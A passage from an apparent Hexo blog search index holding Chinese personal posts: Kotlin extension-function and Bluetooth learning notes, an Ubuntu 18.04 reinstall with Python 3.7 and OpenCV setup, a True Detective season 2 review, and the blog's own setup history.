class="keyword">this</span>[pos2] = tmp</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用：</span></span><br><span class="line"><span class="comment">//把下标为0和3的两个数组元素进行交换</span></span><br><span class="line"><span class="comment">//array可以是整型数组，也可以是双精度数组</span></span><br><span class="line">    array.swap(<span class="number">0</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p><strong>扩展高阶函数</strong>：高阶函数+泛型函数+扩展函数的功能，很强。和前面对比着看。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//给高阶函数进行扩展，形成数组的扩展函数</span><br><span class="line">fun &lt;T&gt; Array&lt;T&gt;.maxCustomize(greater: (T, T) -&gt; Boolean): T? &#123;</span><br><span class="line">    var max: T? = null</span><br><span class="line">    for (item in this)</span><br><span class="line">        if (max == null || greater(item, max))</span><br><span class="line">            max = item</span><br><span class="line">    return max</span><br><span class="line">&#125;</span><br><span class="line">//调用：</span><br><span class="line">//string_array.maxCustomize(&#123; a, b -&gt; a.length &gt; b.length &#125;)</span><br></pre></td></tr></table></figure><p><strong>日期时间函数</strong>：基本上每个Android工程都需要一个类似的工具类来获得不同格式的字符时间串,使用扩展函数可以实现。例如：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//返回开发者指定格式的日期时间字符串</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> Date.<span class="title">getFormatTime</span><span class="params">(format: <span class="type">String</span>=<span class="string">&quot;&quot;</span>)</span></span>: String &#123;</span><br><span class="line">    <span class="keyword">var</span> ft = format</span><br><span class="line">    <span class="keyword">val</span> sdf = <span class="keyword">if</span> (!ft.isEmpty()) SimpleDateFormat(ft)</span><br><span class="line">    <span class="keyword">else</span> SimpleDateFormat(<span class="string">&quot;yyyyMMddHHmmss&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> sdf.format(<span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用：</span></span><br><span class="line">Date().getFormatTime(<span class="string">&quot;yyyy年MM月dd日HH时mm分ss秒&quot;</span>)  </span><br><span class="line">**单例对象**：没学过java，咱也看不懂，他说像是一种阉割了的简化类。</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/LearnKotlin/2.jpg"></p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//关键字object用来声明单例对象，就像Java中开发者自己定义的Utils工具类。</span></span><br><span class="line"><span class="comment">//其内部的属性等同于Java中的static静态属性，外部可直接获取属性值。</span></span><br><span class="line"><span class="keyword">object</span> DateUtil &#123;</span><br><span class="line">    /声明一个当前日期时间的属性，</span><br><span class="line">    <span class="comment">//返回的日期时间格式形如2017-10-01 10:00:00</span></span><br><span class="line">    <span class="keyword">val</span> nowDateTime: String</span><br><span class="line">        <span class="comment">//外部访问DateUtil.nowDateTime时，会自动调用nowDateTime附属的get方法得到它的值</span></span><br><span class="line">        <span class="keyword">get</span>() &#123;</span><br><span class="line">            <span class="keyword">val</span> sdf = SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> sdf.format(Date())</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用：</span></span><br><span class="line">DateUtil.nowDateTime</span><br></pre></td></tr></table></figure><p>调用变得简洁了很多。第四章结束。</p><h2 id="20190711"><a href="#20190711" class="headerlink" title="20190711"></a>20190711</h2><p>跳过了书，直接开始搞蓝牙开发。  </p><p>参考资料：  </p><p><a href="https://blog.csdn.net/TomCat0916/article/details/80408691#_5">学习笔记__基于Kotlin的蓝牙通信工具类</a></p><p><a href="https://www.cnblogs.com/android-blogs/p/5454671.html">Android蓝牙实例（和单片机蓝牙模块通信）</a></p><p><a href="https://developer.android.com/guide/topics/connectivity/bluetooth.html?hl=zh-cn">经典蓝牙的官方开发文档（中文)</a> </p><p><a href="https://www.kotlincn.net/docs/reference/android-overview.html">Kotlin语言中文站</a> </p><p>然后放到了github上，**<a href="https://github.com/lfalive/Smart-wardrobe">链接</a>**。不过想了一下，比赛还在初期，就不开源了吧。比赛结束再开源，希望能取得一个好成绩。值得一提的是,在AndroidStudio的工程目录自动生成了gitignore文件，忽略了不必要的配置和build文件。</p><p>目前实现了app控制手机蓝牙的开关、显示该手机已配对的蓝牙设备、以及对特定的蓝牙设备(即目前用来测试的HC-05蓝牙片子)进行连接&#x2F;断开连接，同时完成了手机端到HC-05的数据传输。下一步是实现app的数据接收及处理。</p><p><strong>20190714注：</strong>这个牛逼的测试程序有很多bug，我太年轻了，对蓝牙开发的理解还是不够。</p><h2 id="20190714"><a href="#20190714" class="headerlink" title="20190714"></a>20190714</h2><p>前两天没有做笔记，因为发现开发蓝牙太麻烦了，还是用已有的框架吧，然后就折腾了两天……</p><p>因为经典蓝牙的相关框架实在太少，遂转战BLE，这次准备用BLE了。其余内容在项目文档里写了，链接</p><p>旧的测试项目一样。</p><p><strong><a href="https://github.com/lfalive/SmartWardrobe">项目链接</a></strong></p><h2 id="20190717"><a href="#20190717" class="headerlink" title="20190717"></a>20190717</h2><p>第六章 6.1没啥好说。</p>]]></content>
      
      
      <categories>
          
          <category> learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
            <tag> kotlin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重装Ubuntu18.04LTS，安装Python3.7及OpenCV</title>
      <link href="/2019/04/14/OpenCV&amp;Ubuntu/"/>
      <url>/2019/04/14/OpenCV&amp;Ubuntu/</url>
      
        <content type="html"><![CDATA[<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>上周不小心删掉了<code>Ubuntu18.04LTS</code>自带的Python3.6，环境大乱，于是决定重装一波双系统。  </p><p>下载镜像，制作启动盘之类的步骤就不说了，重要的依然是自主分区和引导设置。  </p><p>这次依然是从机械硬盘里分出了50G装Ubuntu，分区大概如下：  </p><table><thead><tr><th align="left">挂载点</th><th align="center">大小</th><th align="center">类型</th></tr></thead><tbody><tr><td align="left">swap</td><td align="center">8G</td><td align="center">逻辑分区，交换空间</td></tr><tr><td align="left">&#x2F;boot</td><td align="center">1000M</td><td align="center">主分区</td></tr><tr><td align="left">&#x2F;</td><td align="center">20G</td><td align="center">主分区</td></tr><tr><td align="left">&#x2F;home</td><td align="center">剩下的</td><td align="center">逻辑分区</td></tr></tbody></table><p>引导选择了<code>sda windows boot manager</code>。</p><p>安装好之后，一些基本的设置和以前一样。</p><p>每次都会遇到双系统的时差问题，参考<a href="https://blog.csdn.net/ITBigGod/article/details/80251633">CSDN上的一篇讲解</a>。在Ubuntu终端执行以下语句即可。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo timedatectl set-local-rtc 1</span><br></pre></td></tr></table></figure><p>还有在Ubuntu下访问Windows的硬盘，提示“只读文件系统”的问题，<a href="https://www.cnblogs.com/tanrong/p/9342376.html">参考链接</a>。  </p><h2 id="Python版本问题"><a href="#Python版本问题" class="headerlink" title="Python版本问题"></a>Python版本问题</h2><p>然后是Python版本的问题。  </p><p><code>Ubuntu18.04LTS</code>自带的是Python3.6，而我想要稍微新一点儿的3.7版本，因为Python支持版本共存，那么直接<code>sudo apt-get install python3.7</code>就行了。  </p><p>然后是切换默认的python版本，即修改软连接，使python直接指向刚刚安装的3.7版本，<a href="https://www.cnblogs.com/shenckicc/p/5683597.html">参考链接</a>。</p><h2 id="默认pip指向的问题"><a href="#默认pip指向的问题" class="headerlink" title="默认pip指向的问题"></a>默认pip指向的问题</h2><p>最初执行<code>sudo pip install opencv-python</code>报错，找不到命令。按照<a href="https://blog.csdn.net/fcku_88/article/details/84191288">参考链接</a>处理，依然失败。  </p><p>于是改用<code>python3 -m pip install --upgrade pip</code>先升级一下系统自带的python3.6的pip，成功。  </p><p>但是执行<code>python -m pip install --upgrade pip</code>失败，说明python3.7没装pip，正常情况下，应该是随着python的安装而安装的……  </p><p><a href="https://blog.csdn.net/MenciusHometown/article/details/77688629">参考链接</a>  </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install python3.7  </span><br><span class="line">sudo apt install python3.7-dev  </span><br><span class="line">sudo apt install python3.7-venv  </span><br></pre></td></tr></table></figure><p>按照教程，最后执行了<code>sudo python3.7 get-pip.py</code>，python3.7下的pip才算弄好了。  </p><p>与此同时，<code>sudo pip</code>命令总算也可以用了。</p><p>接下来就是处理pip和pip3的指向。<a href="https://blog.csdn.net/u012516318/article/details/75339860">参考链接</a>  </p><h2 id="opencv的安装"><a href="#opencv的安装" class="headerlink" title="opencv的安装"></a>opencv的安装</h2><p>这里有很多方法。因为我在python环境下使用opencv，所以就不选择完整包安装了。在opencv的<a href="https://docs.opencv.org/4.1.0/d2/de6/tutorial_py_setup_in_ubuntu.html">官方文档</a>中，建议使用apt-get安装OpenCV-Python，但是我摸到Ubuntu软件包的页面(<a href="https://packages.ubuntu.com/bionic/python3-opencv">链接</a>)，发现opencv的版本为3.2.0，而最新的opencv已经来到了4.1.0（虽然使用还不广泛）。</p><p>经过一番搜索，发现了可以使用pip安装Unofficial pre-built OpenCV packages for Python，即PyPI上已经有了python环境的opencv包(<a href="https://pypi.org/project/opencv-python/">链接</a>)，并且是最新的4.1.0版本。  </p><p>最后决定用pip安装，<code>sudo pip install opencv-contrib-python</code>搞定。  </p><p>得到在python3.7环境下的opencv库，测试，没问题，把封面交了。</p><p><img src="https://img.lfalive.top/OpenCV%26Ubuntu/result.png"></p><p>python版本很多，opencv版本也很多，短期内应该不用再折腾了。</p>]]></content>
      
      
      <categories>
          
          <category> learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> opencv </tag>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>True Detective S2</title>
      <link href="/2019/02/14/TrueDetectiveS2/"/>
      <url>/2019/02/14/TrueDetectiveS2/</url>
      
        <content type="html"><![CDATA[<p>第一季是神作，就8多说了。  </p><p>第二季还是八集，看完第一集：嗯三个主角终于见面了……案子出来了。  </p><p>支线交错发展，线索错综复杂，像剧中转场所大量使用的航拍高速公路一样，看得我云里雾里，却又着了魔一样想知道后面怎么填坑。  </p><p><img src="https://img.lfalive.top/TrueDetectiveS2/1.jpg">第四集发生了一次大规模枪战，die了一大帮人，第五集竟然就是半年之后的故事了，我又是一脸问号嗷。随着剧情的深入，更多东西浮出水面……牛逼。编剧也是狠，最后一集能把人虐死。四个主角就活了一个，大团圆结局是不存在的。  </p><p>哲学是有的，但是没有第一季那么深刻。太深刻了我又看不懂了。  </p><p>影像风格满分！满篇的黑话，满屏的丧。  </p><p>后文引用自知乎。  </p><blockquote><p>黑帮老大弗兰克，出身社会底层的人，三十八岁的时候穿上自己第一件西装，自小到大历经磨难，用尽全力只想从脱离底层，洗白从良，却在一次耗尽自己毕生积蓄的交易中，成为了高层人物角力的牺牲品，顷刻间一无所有，被迫重新回到黑道争锋。  </p></blockquote><blockquote><p>黑警维尔克鲁，本来拥有美好家庭，却遭遇妻子被歹徒强暴的厄运，黑帮老大给了他追凶的线索，却使他走向了私刑报复的不归路，性情大变之余，从正义的执法者变成一名黑警，妻子也因此离他而去；妻子生下一个儿子，却不知道他的父亲到底是自己还是强暴犯，他将自己余下所有的爱都给了这个儿子，却又不敢去探知儿子真实生父的真相，在爱与痛之间变得终日消沉沦落。  </p></blockquote><blockquote><p>女警贝德拉丝，童年一段不堪的过去，让她选择以失忆去遗忘；坦承地面对自己身体欲求却被世俗所投以不公的眼神；身为警探，却有一个通过色情视频去赚取金钱的妹妹，以及新兴宗教组织精神领袖的父亲，彼此身份对立悬殊，家庭关系近乎破裂。  </p></blockquote><blockquote><p>骑警沃德拉夫，拥有能够令无数女性为之疯狂的俊俏外貌，却背负着男同性恋者的隐藏身份；不受诱惑秉公执法，却被诬陷性骚扰异性，偏偏因为不愿意暴露自己男同的身份，落得一个无从辩驳的尴尬处境；为掩饰男同的身份，形式交往了一个女朋友，却在两人分手前让对方怀孕；参军卫国本应是人民的英雄，却因执行军方安排的屠杀任务背负累累人命。  </p></blockquote><p><img src="https://img.lfalive.top/TrueDetectiveS2/2.jpg"></p><p>几位主角的形象都塑造得不错吧，有头有尾的，演员的演技不是特别出彩但都很好。很多配角就没那么幸运了，没漏过几次脸的小角色，可能是案子的关键线索，精心铺垫的支线，可能随着某个角色领便当而走到尽头。  </p><p>最后一集吧，总是让我想起绝命毒师的最后一集。荒漠、戈壁、丛林，有人为了尊严、正义或者爱人慷慨赴死。  </p><p>故事线太多，人物关系复杂，太多暗语、暗喻，看得有一点点吃力，好几次不得不暂停下来去翻前面的剧情。  </p><p><img src="https://img.lfalive.top/TrueDetectiveS2/3.gif"></p><blockquote><p>印在本季主题海报上的那一句<strong>「 WE GET THE WORLD WE DESERVE.」</strong>在剧终的那一刻成了全剧最讽刺的注脚。  </p></blockquote><p>很多人说这一季让人失望，比第一季差了不少。个人认为，这一季总体来说绝对也说是同类型剧集中的佼佼者了，还是不错的。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 真探 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这个博客的诞生历程</title>
      <link href="/2018/08/29/hello-world/"/>
      <url>/2018/08/29/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="2021-4-8更新"><a href="#2021-4-8更新" class="headerlink" title="2021.4.8更新"></a>2021.4.8更新</h2><p><a href="https://butterfly.js.org/">Butterfly主题文档</a></p><p>2021年3月重置博客，更新hexo和主题版本，多了很多新特性，同时也搞了一些魔改。</p><p><a href="https://blog.zhheo.com/p/2e6bbbd0.html">Twikoo评论系统配置教程（基于腾讯云开发）</a></p><p><a href="https://butterfly.js.org/posts/507c070f/#%E9%97%9C%E9%96%89-asset-inject">Butterfly添加全局吸底Aplayer教程</a></p><h2 id="2020-5-8更新"><a href="#2020-5-8更新" class="headerlink" title="2020.5.8更新"></a>2020.5.8更新</h2><p>博客迁移了，使用了hexo，感觉功能更多了，使用主题为<a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a>，功能多，界面好看。</p><p>安装好主题之后，按照<a href="https://jerryc.me/posts/21cfbf15/">作者的文档</a>做了一些配置，也就是一些基本配置 ，头图、评论系统、统计系统等，那些花里胡哨的点击效果就没有搞了。</p><p>然后访问速度还是比较慢，所以这次把图都放到了七牛云，之后写一下具体步骤。</p><h2 id="原博客介绍"><a href="#原博客介绍" class="headerlink" title="原博客介绍"></a>原博客介绍</h2><h3 id="关于Jekyll"><a href="#关于Jekyll" class="headerlink" title="关于Jekyll"></a>关于Jekyll</h3><p>摘自百度百科：Jekyll是一个简单的免费的Blog生成工具，类似WordPress。但是和WordPress又有很大的不同，原因是Jekyll只是一个生成静态网页的工具，不需要数据库支持。但是可以配合第三方服务,例如Disqus。最关键的是Jekyll可以免费部署在Github上，而且可以绑定自己的域名。</p><p>最后决定用Github Pages和Jkeyll简单搭建一下。  </p><h3 id="关于Github-Pages"><a href="#关于Github-Pages" class="headerlink" title="关于Github Pages"></a>关于Github Pages</h3><p>用途多多，网上资料也是一大堆。</p><p><a href="https://pages.github.com/">Github Pages官网</a></p><h3 id="关于主题"><a href="#关于主题" class="headerlink" title="关于主题"></a>关于主题</h3><p>首先需要找一个自己喜欢的主题。 因为初次尝试，不熟悉Jekyll的目录结构，所以选了一个中文文档写得很详细的主题，也很漂亮，叫做“H2O”。 </p><p><a href="https://github.com/kaeyleo/jekyll-theme-H2O">该主题原项目</a></p><p><a href="http://jekyllthemes.org/">更多主题</a></p><h3 id="关于本地预览"><a href="#关于本地预览" class="headerlink" title="关于本地预览"></a>关于本地预览</h3><p>不搭建本地环境则不能实现本地预览，如果只是想使用主题，而不需要本地预览，可以跳过搭建本地环境的过程。关于本地环境的搭建，也有很多教程的。 一切从简，我也没有搭建本地环境。</p><h3 id="关于博客配置"><a href="#关于博客配置" class="headerlink" title="关于博客配置"></a>关于博客配置</h3><p>模板有了，接下来就是修改模板中的默认信息为自己的信息了。 可以直接Fork主题模板到自己Github库里，然后clone到本地修改配置文件，再一次次push。 也可以下载模板到本地后，修改好配置文件再push到自己库里吧。</p><p>配置文件一般为<code>_config.yml</code>，我也是对照着文档慢慢修改的。每个主题的拥有的功能也不尽相同，通过了解文档，我修改了个人信息、头图以及一些设置。</p><h3 id="关于写文章"><a href="#关于写文章" class="headerlink" title="关于写文章"></a>关于写文章</h3><p>Markdown是个好东西。不了解语法的话，也还是自己找资料吧！在本地写好后，push一下就可以了，非常方便。  </p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://liaokeyu.com/">主题作者博客</a></p><p><a href="https://blog.csdn.net/qq_27888241/article/details/77104922">使用Jekyll + GitHub Pages搭建个人博客</a></p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
            <tag> Jekyll </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
